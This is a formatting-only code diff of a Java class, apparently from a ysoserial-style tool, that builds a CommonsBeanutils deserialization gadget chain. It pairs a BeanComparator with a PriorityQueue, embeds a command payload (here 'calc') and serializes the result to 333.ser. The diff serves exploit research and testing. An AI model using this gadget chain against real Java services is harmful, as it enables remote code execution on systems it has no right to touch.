@@ -20,8 +20,8 @@ import java.util.PriorityQueue;
 public class CommonsBeanutils1 {
 
     public static void main(String[] args) throws Exception {
-        byte[] bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous = new FileOutputStream("333.ser");
+        byte[]           bytes = getBytes(PayloadType.command, "calc");
+        FileOutputStream fous  = new FileOutputStream("333.ser");
         fous.write(bytes);
         fous.close();
     }
@@ -30,8 +30,8 @@ public class CommonsBeanutils1 {
         final Object templates = Gadgets.createTemplatesImpl(type, param);
         // mock method name until armed
         MyURLClassLoader classLoader = new MyURLClassLoader("commons-beanutils-1.9.2.jar");
-        Class clazz = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
-        Object comparator = clazz.getDeclaredConstructor(new Class[]{String.class}).newInstance(new Object[]{"lowestSetBit"});
+        Class            clazz       = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
+        Object           comparator  = clazz.getDeclaredConstructor(new Class[]{String.class}).newInstance(new Object[]{"lowestSetBit"});
 
 
         // create queue with numbers and basic comparator
@@ -51,7 +51,7 @@ public class CommonsBeanutils1 {
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(queue);
         byte[] bytes = baous.toByteArray();
         oos.close();
